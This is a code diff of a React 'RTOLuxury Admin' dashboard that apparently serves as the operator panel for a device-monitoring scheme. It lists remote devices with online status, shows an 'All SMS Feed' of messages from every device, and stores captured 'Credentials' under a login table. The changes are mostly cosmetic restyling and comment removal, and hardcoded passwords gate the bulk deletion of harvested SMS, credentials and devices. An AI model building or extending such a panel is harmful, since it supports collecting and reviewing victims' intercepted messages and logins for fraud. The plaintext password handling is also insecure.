@@ -10,11 +10,10 @@ import BackupPanel from "../components/BackupPanel";
 import AnalyticsPanel from "../components/AnalyticsPanel";
 import AllDevicesSmsPanel from "../components/AllDevicesSmsPanel";
 
-// PASSWORDS CONFIGURATION
-const ADMIN_PASSWORD = "123890";          // Screen Unlock Password
-const DELETE_SMS_PASSWORD = "Baba@1234";      // SMS Delete Password
-const DELETE_CRED_PASSWORD = "Baba@1234";     // Credentials Delete Password
-const DELETE_DEVICES_PASSWORD = "Baba@1234";  // Devices Delete Password
+const ADMIN_PASSWORD = "123890";
+const DELETE_SMS_PASSWORD = "Baba@1234";
+const DELETE_CRED_PASSWORD = "Baba@1234";
+const DELETE_DEVICES_PASSWORD = "Baba@1234";
 
 export default function AdminDashboard() {
   const [isAuthenticated, setIsAuthenticated] = useState(false);
@@ -112,14 +111,11 @@ export default function AdminDashboard() {
         const s = devStatus[id] || {};
 
         let isOnline = false;
-
-        // 1. Explicit string status check
         const rawStatus = (s.status || d.status || "").toString().toLowerCase().trim();
         if (rawStatus === "online") {
           isOnline = true;
         }
 
-        // 2. Timestamp / Last seen check (Under 90 seconds)
         const rawTime = s.last_seen || d.last_online || d.timestamp;
         if (rawTime) {
           let parsedTime = 0;
@@ -148,7 +144,6 @@ export default function AdminDashboard() {
     return () => unsubscribe();
   }, [isAuthenticated]);
 
-  // DELETE ALL SMS - Password: Baba@1234
   const deleteAllSms = () => {
     const pwd = prompt("🔐 Enter Password to Delete ALL SMS:");
     if (pwd !== DELETE_SMS_PASSWORD) return showToast("❌ Invalid Password for SMS deletion", "error");
@@ -156,7 +151,6 @@ export default function AdminDashboard() {
     remove(ref(db, "user_sms")).then(() => showToast("✅ All SMS Deleted", "success"));
   };
 
-  // DELETE ALL CREDENTIALS - Password: Baba@1234
   const deleteAllCredentials = () => {
     const pwd = prompt("🔐 Enter Password to Delete ALL Credentials:");
     if (pwd !== DELETE_CRED_PASSWORD) return showToast("❌ Invalid Password for Credential deletion", "error");
@@ -164,7 +158,6 @@ export default function AdminDashboard() {
     remove(ref(db, "login")).then(() => showToast("✅ All Credentials Deleted", "success"));
   };
 
-  // DELETE ALL DEVICES - Password: Baba@1234
   const deleteAllDevices = () => {
     const pwd = prompt("🔐 Enter Password to Delete ALL DEVICES:");
     if (pwd !== DELETE_DEVICES_PASSWORD) return showToast("❌ Invalid Password for Devices deletion", "error");
@@ -206,10 +199,10 @@ export default function AdminDashboard() {
           textAlign: "center"
         }}>
           <div style={{ fontSize: 44, color: "var(--gold)", marginBottom: 12 }}>✦</div>
-          <h2 style={{ fontFamily: "Playfair Display, serif", color: "var(--gold)", fontSize: 24, marginBottom: 6 }}>
+          <h2 style={{ fontFamily: "Playfair Display, serif", color: "var(--text-primary)", fontSize: 24, marginBottom: 6 }}>
             RTO<em>Luxury</em> Admin
           </h2>
-          <p style={{ color: "var(--text-muted)", fontSize: 13, marginBottom: 24 }}>
+          <p style={{ color: "var(--text-secondary)", fontSize: 13, marginBottom: 24 }}>
             Enter Master Password to Access System
           </p>
 
@@ -217,7 +210,7 @@ export default function AdminDashboard() {
             <div style={{ marginBottom: 16 }}>
               <input
                 type="password"
-                placeholder="Enter Password (890890)"
+                placeholder="Enter Password"
                 value={passwordInput}
                 onChange={(e) => setPasswordInput(e.target.value)}
                 autoFocus
@@ -235,7 +228,7 @@ export default function AdminDashboard() {
                 }}
               />
               {passwordError && (
-                <div style={{ color: "var(--red)", fontSize: 11, marginTop: 6 }}>
+                <div style={{ color: "var(--red)", fontSize: 11, marginTop: 6, fontWeight: 600 }}>
                   ❌ Incorrect Password. Please try again.
                 </div>
               )}
@@ -302,7 +295,7 @@ export default function AdminDashboard() {
             <button className={`nav-item ${activePanel === "all_messages" ? "active" : ""}`} onClick={() => setActivePanel("all_messages")}>
               <i className="fas fa-comments" style={{ color: "var(--gold)" }}></i>
               <span>All SMS Feed</span>
-              <span className="nav-badge" style={{ color: "var(--gold)", borderColor: "var(--gold)" }}>{totalSmsCount}</span>
+              <span className="nav-badge">{totalSmsCount}</span>
             </button>
             <button className={`nav-item ${activePanel === "sms" ? "active" : ""}`} onClick={() => setActivePanel("sms")}>
               <i className="fas fa-envelope"></i>
@@ -408,7 +401,6 @@ export default function AdminDashboard() {
         </button>
       </nav>
 
-      {/* FULL SMS MODAL POPUP */}
       {smsModalDevice && (
         <div 
           className="modal-luxury open" 
@@ -442,15 +434,16 @@ export default function AdminDashboard() {
                     <div 
                       key={idx} 
                       style={{
-                        background: "rgba(10, 13, 20, 0.7)",
+                        background: "#ffffff",
                         border: "1px solid var(--border-color)",
-                        borderLeft: "3px solid var(--gold)",
+                        borderLeft: "4px solid var(--gold)",
                         borderRadius: 8,
-                        padding: 10
+                        padding: 10,
+                        boxShadow: "0 2px 6px rgba(0,0,0,0.04)"
                       }}
                     >
                       <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 4 }}>
-                        <span style={{ color: "var(--gold-light)", fontWeight: 700, fontSize: 12 }}>
+                        <span style={{ color: "var(--text-primary)", fontWeight: 700, fontSize: 12 }}>
                           👤 {msg.sender || msg.address || "Unknown"}
                         </span>
                         <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
@@ -466,7 +459,7 @@ export default function AdminDashboard() {
                             style={{
                               background: "transparent",
                               border: "none",
-                              color: "var(--text-muted)",
+                              color: "var(--text-secondary)",
                               cursor: "pointer",
                               fontSize: 11
                             }}
